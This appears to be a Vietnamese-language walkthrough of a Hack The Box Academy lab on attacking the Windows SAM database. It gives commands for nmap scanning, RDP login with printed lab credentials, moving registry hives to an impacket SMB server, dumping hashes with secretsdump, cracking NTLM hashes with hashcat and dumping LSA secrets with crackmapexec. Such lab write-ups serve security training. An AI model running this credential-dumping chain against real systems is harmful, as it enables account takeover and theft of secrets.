<h1>Attacking SAM</h1>

![image](https://github.com/user-attachments/assets/b9dc8a76-cf70-47d7-b600-71a8faef7b51)

![image](https://github.com/user-attachments/assets/b3544515-a062-4d3d-9b72-188eb89dbf8c)

Chạy `nmap -sV 10.129.195.118` thì có nhiều port mở, chú ý đến rdp 3389:

![image](https://github.com/user-attachments/assets/cb08fa66-0653-409f-b909-e2aeae474206)

`xfreerdp /u:'Bob' /p:'HTB_@cademy_stdnt!' /v:10.129.195.118` vào và lấy sam trong đó:

![image](https://github.com/user-attachments/assets/e5d2fd6f-b43c-4fd3-8118-e1d1aa3da864)

Chạy `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-1594028` để đợi file sam từ máy windows:

![image](https://github.com/user-attachments/assets/b55e23fc-f46f-4ff7-99aa-7e0af646e2b6)

![image](https://github.com/user-attachments/assets/85707092-f68c-45ee-82b7-21d3d9475f13)

Và tôi đã lấy được về máy:

![image](https://github.com/user-attachments/assets/ceb169c7-fbe6-491b-a2c3-666a43ecc8b6)

Dùng `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`  để lấy thông tin từ các file sam:

![image](https://github.com/user-attachments/assets/2c1305c8-207a-45e5-99a1-3805e13ed8ab)

Thêm các hash vào file pass.txt và chạy `sudo hashcat -m 1000 /home/htb-ac-1594028/pass.txt rockyou.txt` để brute force hash:

![image](https://github.com/user-attachments/assets/c7629259-7ed6-4fcb-bbc8-5cc4b9fa7c7d)

![image](https://github.com/user-attachments/assets/59daab20-e0a1-4b2e-8272-3b7452facf86)

![image](https://github.com/user-attachments/assets/431e8d7a-c871-4f93-b399-a8e676b8f8b2)

Cái `31d6cfe0d16ae931b73c59d7e0c089c0` không thấy kết quả nhưng mà đã được thêm câu:

![image](https://github.com/user-attachments/assets/cbe36631-6e93-4900-bce0-b105f69c6e85)

Dùng `crackmapexec smb 10.129.195.118 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa` cho câu cuối:

![image](https://github.com/user-attachments/assets/8ca8ffb0-6f97-4e06-8df3-991614ac2712)

![image](https://github.com/user-attachments/assets/ca1d7325-09cc-490e-a40d-3643460d73b0)

Tìm hiểu thêm thông tin:

![image](https://github.com/user-attachments/assets/8c177c88-7919-4d13-9270-dc1d2795a358)

